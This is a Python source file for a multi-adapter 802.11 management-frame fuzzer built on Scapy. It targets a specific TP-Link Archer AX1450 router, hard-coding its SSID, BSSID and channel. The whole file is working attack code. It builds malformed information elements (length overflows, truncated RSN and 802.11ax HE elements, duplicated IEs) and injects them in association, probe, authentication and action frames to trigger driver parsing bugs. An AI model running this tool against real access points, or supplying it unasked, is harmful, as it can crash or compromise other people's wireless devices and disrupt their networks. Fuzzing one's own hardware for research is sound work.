# 802.11 IE MUTATION FRAME FUZZER
# TARGET: TP-Link Archer AX1450
# GOAL: trigger driver parsing bugs via malformed management frames


# UI IMPORTS
from rich.console import Console
from rich.panel import Panel
from rich.live import Live


# NETWORK IMPORTS
from scapy.all import RadioTap, sendp, RandMAC, Raw, conf
from scapy.layers.dot11 import Dot11, Dot11Elt, Dot11AssoReq, Dot11Auth, Dot11ProbeReq


# ETC IMPORTS
import threading, time, random, os


# CONSTANTS
console  = Console()
LOCK     = threading.Lock()
conf.verb = 0




# ========================
#   CONFIG
# ========================

TARGET_SSID    = "TP-Link_26B8"
TARGET_BSSID   = "a8:6e:84:f3:26:b6" 
TARGET_VENDOR  = " Tp-Link Corporation Pte. Ltd."
TARGET_CHANNEL = 4 
DELAY          = 0.05                   

IFACES = [
    "wlan1",
    "wlan2",
    "wlan3",
    "wlan4",
]




class IE_Mutator():
    """This will house all IE mutation methods"""


    @staticmethod
    def length_overflow(ie_id):
        """Advertise 255 bytes, only give 4"""
        return bytes([ie_id, 255]) + os.urandom(4)


    @staticmethod
    def zero_length_with_data(ie_id):
        """Length = 0 but data follows"""
        return bytes([ie_id, 0]) + os.urandom(16)


    @staticmethod
    def max_garbage(ie_id):
        """255 bytes of random garbage"""
        return bytes([ie_id, 255]) + os.urandom(255)


    @staticmethod
    def vendor_truncated():
        """Vendor Specific IE (ID 221) truncated after OUI"""
        return bytes([221, 5]) + os.urandom(3)


    @staticmethod
    def rsn_mismatched_count():
        """RSN IE (ID 48) - claim 255 pairwise suites, provide 1"""
        data  = b'\x01\x00'
        data += b'\x00\x0f\xac\x04'
        data += b'\xff\x00'
        data += os.urandom(4)
        return bytes([48, len(data)]) + data


    @staticmethod
    def he_caps_truncated():
        """HE Capabilities IE (802.11ax ext ID 35) - truncated"""
        payload = bytes([35]) + os.urandom(random.randint(1, 3))
        return bytes([255, len(payload)]) + payload


    @staticmethod
    def he_caps_overflow():
        """HE Capabilities IE (802.11ax) - length overflow"""
        payload = bytes([35]) + os.urandom(255)
        return bytes([255, 255]) + payload


    @staticmethod
    def he_operation_malformed():
        """HE Operation IE (802.11ax ext ID 36) - malformed"""
        payload = bytes([36]) + os.urandom(random.randint(0, 8))
        return bytes([255, len(payload)]) + payload


    @staticmethod
    def duplicate_ies(ie_id):
        """Same IE ID repeated 5-20 times"""
        result = b''
        for _ in range(random.randint(5, 20)):
            data    = os.urandom(random.randint(1, 32))
            result += bytes([ie_id, len(data)]) + data
        return result


    @staticmethod
    def nested_vendor():
        """RSN IE stuffed inside a Vendor Specific IE"""
        inner   = bytes([48, 10]) + os.urandom(10)
        payload = b'\x00\x50\xf2\x01' + inner
        return bytes([221, len(payload)]) + payload


    @staticmethod
    def ht_caps_overflow():
        """HT Capabilities IE (ID 45) - should be 26 bytes, give 255"""
        return bytes([45, 255]) + os.urandom(255)


    @staticmethod
    def vht_caps_overflow():
        """VHT Capabilities IE (ID 191) - should be 12 bytes, give garbage"""
        return bytes([191, 255]) + os.urandom(255)


    @staticmethod
    def random_unknown():
        """Random IE in the reserved/unknown ID range"""
        ie_id = random.randint(150, 220)
        data  = os.urandom(random.randint(1, 255))
        return bytes([ie_id, len(data)]) + data


    @classmethod
    def get(cls):
        """Pick a random mutation - 40% chance to stack a second one on top"""

        mutations = [
            lambda: cls.length_overflow(random.randint(0, 127)),
            lambda: cls.zero_length_with_data(random.randint(0, 127)),
            lambda: cls.max_garbage(random.randint(0, 127)),
            lambda: cls.vendor_truncated(),
            lambda: cls.rsn_mismatched_count(),
            lambda: cls.he_caps_truncated(),
            lambda: cls.he_caps_overflow(),
            lambda: cls.he_operation_malformed(),
            lambda: cls.duplicate_ies(random.randint(0, 60)),
            lambda: cls.nested_vendor(),
            lambda: cls.ht_caps_overflow(),
            lambda: cls.vht_caps_overflow(),
            lambda: cls.random_unknown(),
        ]

        payload = random.choice(mutations)()

        if random.random() < 0.4:
            payload += random.choice(mutations)()

        return payload




class Frame_Builder():
    """This will house all frame building methods"""


    @staticmethod
    def _src():
        return str(RandMAC())


    @classmethod
    def assoc_req(cls, bssid):
        """Malformed Association Request"""
        src   = cls._src()
        dot11 = Dot11(type=0, subtype=0, addr1=bssid, addr2=src, addr3=bssid)
        body  = Dot11AssoReq(cap=0x0431, listen_interval=10)
        ssid  = Dot11Elt(ID="SSID", info=b"")
        return RadioTap() / dot11 / body / ssid / Raw(load=IE_Mutator.get())


    @classmethod
    def probe_req(cls):
        """Malformed Probe Request - broadcast"""
        src   = cls._src()
        dot11 = Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff", addr2=src, addr3="ff:ff:ff:ff:ff:ff")
        ssid  = Dot11Elt(ID="SSID", info=b"")
        return RadioTap() / dot11 / Dot11ProbeReq() / ssid / Raw(load=IE_Mutator.get())


    @classmethod
    def auth(cls, bssid):
        """Malformed Authentication frame"""
        src   = cls._src()
        dot11 = Dot11(type=0, subtype=11, addr1=bssid, addr2=src, addr3=bssid)
        body  = Dot11Auth(algo=0, seqnum=1, status=0)
        return RadioTap() / dot11 / body / Raw(load=IE_Mutator.get())


    @classmethod
    def twt_action(cls, bssid):
        """TWT Action frame - 802.11ax specific"""
        src   = cls._src()
        dot11 = Dot11(type=0, subtype=13, addr1=bssid, addr2=src, addr3=bssid)
        body  = bytes([6, 1]) + os.urandom(random.randint(0, 64))
        return RadioTap() / dot11 / Raw(load=body)


    @classmethod
    def block_ack_action(cls, bssid):
        """Malformed Block Ack Action frame"""
        src   = cls._src()
        dot11 = Dot11(type=0, subtype=13, addr1=bssid, addr2=src, addr3=bssid)
        body  = bytes([3, random.randint(0, 3)]) + os.urandom(random.randint(0, 255))
        return RadioTap() / dot11 / Raw(load=body)


    @classmethod
    def build(cls, frame_type, bssid):
        """Build a frame by type"""

        frames = {
            "assoc":     lambda: cls.assoc_req(bssid),
            "probe":     lambda: cls.probe_req(),
            "auth":      lambda: cls.auth(bssid),
            "twt":       lambda: cls.twt_action(bssid),
            "block_ack": lambda: cls.block_ack_action(bssid),
        }

        return frames.get(frame_type, lambda: cls.probe_req())()




class Frame_Fuzzer():
    """This will orchestrate fuzzing across multiple adapters simultaneously"""


    # CLASS VARS
    RUNNING = False
    stats   = {}

    # ADAPTER ASSIGNMENTS
    assignments = [
        ["assoc", "auth"],
        ["probe"],
        ["twt", "block_ack"],
        ["assoc", "probe", "auth", "twt", "block_ack"],
    ]


    @classmethod
    def _worker(cls, iface, frame_types, bssid, delay):
        """Fuzzer worker - one per adapter"""

        sent          = 0
        cls.stats[iface] = 0

        console.print(f"[bold green][+] {iface} started → {frame_types}")

        while cls.RUNNING:

            try:

                frame_type = random.choice(frame_types)
                frame      = Frame_Builder.build(frame_type=frame_type, bssid=bssid)

                sendp(frame, iface=iface, verbose=0)
                sent += 1

                with LOCK: cls.stats[iface] = sent

                time.sleep(delay)

            except Exception as e: console.print(f"[bold red][!] {iface} error: {e}"); time.sleep(0.5)


    @classmethod
    def main(cls):
        """This will start class wide logic"""

        cls.RUNNING = True
        cls.stats   = {}

        bssid  = TARGET_BSSID
        ifaces = IFACES
        delay  = DELAY

        panel = Panel(
            renderable=f"[bold red]Target:[/bold red] {bssid}   [bold red]Adapters:[/bold red] {ifaces}",
            title="[bold red]NSM Frame Fuzzer",
            border_style="bold yellow",
            expand=False
        )

        console.print(panel)


        for i, iface in enumerate(ifaces):
            frame_types = cls.assignments[i % len(cls.assignments)]
            threading.Thread(target=cls._worker, args=(iface, frame_types, bssid, delay), daemon=True).start()


        try:

            while True:

                time.sleep(5)

                with LOCK:
                    total = sum(cls.stats.values())
                    lines = "   ".join([f"[bold cyan]{iface}:[/bold cyan] [bold yellow]{cls.stats.get(iface, 0)}" for iface in ifaces])
                    console.print(f"[bold green][~][/bold green] {lines}   [bold red]Total:[/bold red] [bold yellow]{total}")


        except KeyboardInterrupt: cls.RUNNING = False; console.print("\n[bold red][-] Stopped.")




if __name__ == "__main__": Frame_Fuzzer.main()

